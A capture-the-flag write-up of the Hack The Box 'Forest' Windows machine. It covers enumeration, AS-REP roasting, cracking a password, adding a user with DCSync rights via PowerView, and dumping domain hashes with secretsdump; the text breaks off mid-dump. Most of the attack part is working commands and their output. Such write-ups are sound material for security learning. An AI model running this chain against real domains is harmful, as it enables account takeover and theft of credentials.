---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: smb nullsession netexec rpc rpcclient as-rep roastingattack kerberos preauthentication getnpusers.py bloodhound bloodhound-python nestedgroups exchangewindowspermissions dcsync secretsdump.py writedacl psexec.py passthehash 
---

<br />

![1](../../../assets/images/Forest/1.png)

<br />

OS -> Windows.

Difficulty -> Easy.

<br />

# Introduction:

<br />

Hello hackers! Today we’ll tackle the Forest Machine, an Easy Windows box. We begin by enumerating SMB and RPC services to leak domain users. One of them has pre-authentication disabled, so we perform an AS-REP Roasting attack and crack their hash to get valid credentials. Once inside, we use BloodHound to analyze privilege relationships in Active Directory and discover a path that allows us to abuse nested group memberships to assign DCSync rights to a new user. We then extract the Administrator hash and use Pass-the-Hash with PsExec to gain full SYSTEM access.

<br />

# Enumeration:

<br />

We start by running a typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.10.161 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-07 11:59 CEST
Nmap scan report for 10.10.10.161
Host is up (0.044s latency).
Not shown: 65239 closed tcp ports (reset), 272 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-07 10:08:28Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49966/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-07T10:09:21
|_  start_date: 2025-06-07T10:00:26
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-06-07T03:09:20-07:00
|_clock-skew: mean: 2h28m11s, deviation: 4h02m31s, median: 8m10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.43 seconds
```

<br />

Relevant open ports:

- `Port 53`   -> dns

- `Port 88`   -> kerberos

- `Port 135`  -> rpc

- `Port 139`  -> netbios

- `Port 389`  -> ldap

- `Port 445`  -> smb

- `Port 464`  -> kpasswd (kerberos password change)

- `Port 593`  -> rpc over http

- `Port 636`  -> ldaps

- `Port 5985` -> winrm

<br />

The domain `htb.local` and the FQDN `FOREST.htb.local` appear across multiple services and ports, so we add them to our `/etc/hosts` file:

<br />

```bash
10.10.10.161 htb.local FOREST.htb.local
```

<br />

# DNS Enumeration: -> Port 53

<br />

We can resolve `htb.local` to perform a DNS query with `dig`:

<br />

```bash
❯ dig htb.local @10.10.10.161

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> htb.local @10.10.10.161
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62451
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 5b92f1f0c9eb1852 (echoed)
;; QUESTION SECTION:
;htb.local.			IN	A

;; ANSWER SECTION:
htb.local.		600	IN	A	10.10.10.161

;; Query time: 60 msec
;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)
;; WHEN: Sat Jun 07 12:08:08 CEST 2025
;; MSG SIZE  rcvd: 66
```

<br />

But we can't do a complete zone transfer:

<br />

```bash
❯ dig axfr htb.local @10.10.10.161

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr htb.local @10.10.10.161
;; global options: +cmd
; Transfer failed.
```

<br />

# SMB Enumeration: -> Port 445

<br />

To start enumerating information about the system, we will run a typical `netexec` oneliner:

<br />

```bash
❯ netexec smb htb.local
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

<br />

With this output, we verify the domain `htb.local`, which we discovered before with nmap.

We can verify that we're dealing with a `Windows Server 2016 Standard` and `14393` build version.

Continuing enumeration, we use a fake user and password to get more information without success:

<br />

```bash
❯ netexec smb htb.local -u "RandomFakeUser" -p "RandomFakePass" --shares
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [-] htb.local\RandomFakeUser:RandomFakePass STATUS_LOGON_FAILURE 
```

<br />

Null session login also fails.

<br />

# RPC Enumeration: -> Port 445

<br />

As we know, we can get very relevant information like valid usernames with `rpcclient`.

To do this, we run the following command:

<br />

```bash
❯ rpcclient -U "" -N -c "enumdomusers" htb.local
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

<br />

We can list the `groups` as well:

<br />

```bash
❯ rpcclient -U "" -N -c "enumdomgroups" htb.local
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```

<br />

# AS-REP Roasting Attack:

<br />

There is a well-known vulnerability called `AS-REP Roasting Attack` that can allow us to retrieve a user's Kerberos hash and brute-force it to obtain valid credentials. [This page](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/) explains the vulnerability very well

However, to perform this attack, the user must have the `DONT_REQUIRE_PREAUTH` flag set in the `UserAccountControl` attribute. 

To try this attack, we only need a list of users, and if we remember, we have a valid one obtained using `rpclient`:

<br />

```bash
Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

<br />

To check if a user meets this condition, we'll run `GetNPUsers.py`, passing in this list:

<br />

```bash
❯ GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:faad32a1b15a8b2560541e965d16592f$cbbd81cde7f55b546981c92f0e046d45d12396cc9653783f5daee4b8205e87c1b0e310deffcb5d85f0888aa577703ce864a3fb26edbf1a2d028cfbedb06771bb80586688bcd25b998015b9c4a56d9218e16d6d28cb7e4d8994ab419c4fab4cbe59baad988d2bf3b7d71a11cdd4bc5261bfac00807b511ed64ea21789508fdafd06d6be8a81643447dbbf4235eddab81db670c9792276dc7911958cae5eb903d278d0b0ff69311f1e006f68d04d46923e3e2ac029991331a776788606bdbb8c26f90f0f700a08e0199dbcefcc7155902ccc377ca24db10e30bda680162aed397696a07bedd40e
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

<br />

Now that we've obtained the `AS-REP` hash for the user `svc-alfresco`, we can attempt to crack it offline using either `Hashcat` or `John the Ripper`:

<br />

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:05 DONE (2025-06-07 12:53) 0.1680g/s 686682p/s 686682c/s 686682C/s s521521..s3r3n!t
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

<br />

The hash was cracked successfully.

If we try to use these credentials to log in with `Evil-WinRM`, it works:

<br />

```bash
❯ evil-winrm -i htb.local -u 'svc-alfresco' -p 's3rvice'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

<br />

Now we can retrieve the `user.txt` flag:

<br />

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
74e13bb90682f97a1a44c39a76xxxxxx
```

<br />

# Privilege Escalation: svc-alfresco -> NT AUTHORITY\SYSTEM 

<br />

Since we're already inside the target machine, we can begin gathering Active Directory information for privilege escalation. `BloodHound` is a great tool for this purpose.

<br />

## BloodHound setup:

<br />

Installing this tool can be a bit tricky if it's your first time.

To make this easier, follow this step by step guide:

<br />

- 1.- Create a directory to store all the installation resources.

<br />

```bash 
mkdir BloodHound; cd BloodHound
```

<br />

- 2.- Download the `bloodhound-cli` archive:

<br />

```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
```

<br />

- 3.- Extract the contents of the archive:

<br />

```bash
❯ tar -xvzf  bloodhound-cli-linux-amd64.tar.gz
bloodhound-cli
```

<br />

- 4.- Run the BloodHound `binary` to start the automatic setup process:

<br />

```bash
❯ ./bloodhound-cli install
[+] Checking the status of Docker and the Compose plugin...
[+] The `compose` plugin is not installed, so we'll try the deprecated `docker-compose` script
[+] The `docker-compose` script is installed, so we'll use that instead
[+] Starting BloodHound environment installation
[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
...[snip]...
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: 7DEgjx22HQxLYTmAaoGDGMv4l4qGgF5H
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

<br />

- 5.- Access BloodHound login panel at `http://127.0.0.1:8080/ui/login`:

<br />

![2](../../../assets/images/Forest/2.png)

<br />

- 6.- Log in with the `default password` given in the installation output and select a new one:

<br />

![3](../../../assets/images/Forest/3.png)

<br />

- 7.- Once inside, we'll see the following message:

<br />

![4](../../../assets/images/Forest/4.png)

<br />

As shown, we need to upload a file with our Windows system target information.

<br />

### bloodhound-python:

<br />

To collect this information remotely, we will use [bloodhound-python](https://github.com/dirkjanm/BloodHound.py).

We only need to run the following command:

<br />

```bash
❯ bloodhound-python -u 'svc-alfresco' -p 's3rvice' -c All -d htb.local -ns 10.10.10.161 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
WARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 17S
INFO: Compressing output into 20250607140718_bloodhound.zip
```

<br />

There was an error in the output: `"Clock skew too great"`.

This error indicates that there's a significant time difference between our system and the target.

The solution is to run `ntpdate`:

<br />

```bash
❯ ntpdate 10.10.10.161
2025-06-07 14:17:19.42273 (+0200) +490.993989 +/- 0.022237 10.10.10.161 s1 no-leap
CLOCK: time stepped by 490.993989
```

<br />

And run `bloodhound-python` again:

<br />

```bash
❯ bloodhound-python -u 'svc-alfresco' -p 's3rvice' -c All -d htb.local -ns 10.10.10.161 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 15S
INFO: Compressing output into 20250607141748_bloodhound.zip
```

<br />

Now that we have the `.zip` file, we can upload it to `BloodHound` for analysis by clicking on `"Start by uploading your data"` -> `"Upload File(s)"`.

Once the file is correctly uploaded and ingested, we can click on `"Explore"` -> `"Cypher"` and search for `"Shortest Paths to Domain Admins"`:

<br />

![5](../../../assets/images/Forest/5.png)

<br />

There are two steps that allow us to escalate from `svc-alfresco` to `Administrator`.

<br />

## Create a new user && Join Exchange Windows Permissions group:

<br />

Our user `svc-alfresco` is in the `Service Accounts` group, which is nested inside `Privileged IT Accounts`, and that in turn belongs to `Account Operators`.

Due to this nested group structure, `svc-alfresco` inherits membership in the `Account Operators` group.

If we right-click on `"WriteDacl"` -> `"Windows Abuse"`, we'll find a step by step guide to escalate by abusing this privilege:

<br />

![6](../../../assets/images/Forest/6.png)
 
<br />

We'll start by creating a new user and adding it to the `Exchange Windows Permissions` group:

<br />

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user H4ck Password123- /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" H4ck /add
The command completed successfully.
```

<br />

We can check if our commands were correctly executed:

<br />

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user H4ck
User name                    H4ck
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/7/2025 6:30:53 AM
Password expires             Never
Password changeable          6/8/2025 6:30:53 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

<br />

## Grant DCSync Privileges:

<br />

Now we’ll run the commands seen earlier in the `Windows Abuse` section to exploit the `WriteDacl` privilege on the domain.

Before running these commands, we'll upload [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/dev/Recon/PowerView.ps1) to the victim machine, because some of this commands are in `PowerShell` language:

<br />

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload PowerView.ps1
                                        
Info: Uploading /root/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

<br />

Once uploaded, we import the module:

<br />

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
```

<br />

Now, let's run the first two commands:

<br />

```bash
$SecPassword = ConvertTo-SecureString 'Password123-' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\H4ck', $SecPassword)
```

<br />

Then, we will run the PowerShell command, that is going to set the `DCSync` privilege:

<br />

```bash
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity H4ck -Rights DCSync
```

<br />

Finally, we only need to run the following `secretsdump.py` oneliner to retrieve all the information via a `DSCync Attack`:

<br />

```bash
❯ secretsdump.py htb.local/H4ck@10.10.10.161
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
H4ck:10601:aad3b435b51404eeaad3b435b51404ee:0f78f38f40ddaea859f2320109914d60:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:25bb48e7e8ce12baecb8c240d1e1f584:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
